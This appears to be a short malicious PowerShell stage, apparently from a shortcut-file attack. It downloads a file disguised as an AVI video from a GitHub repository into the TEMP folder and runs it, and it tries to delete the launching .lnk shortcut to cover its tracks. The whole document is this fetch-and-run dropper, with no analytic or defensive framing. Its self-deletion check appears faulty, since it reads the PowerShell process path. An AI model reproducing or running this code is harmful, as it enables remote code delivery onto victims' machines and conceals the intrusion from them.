$url = "https://github.com/Meowlyn/ww/raw/refs/heads/main/file_example_AVI_1280_1_5MG.avi"
$process = Get-Process -Id $PID
$shortcutPath = $process.Path
if ($shortcutPath -and $shortcutPath.EndsWith(".lnk")) {
    Remove-Item -Path $shortcutPath -Force
}
$tempPath = Join-Path $env:TEMP "video.avi"
Invoke-WebRequest -Uri $url -OutFile $tempPath
Start-Process $tempPath
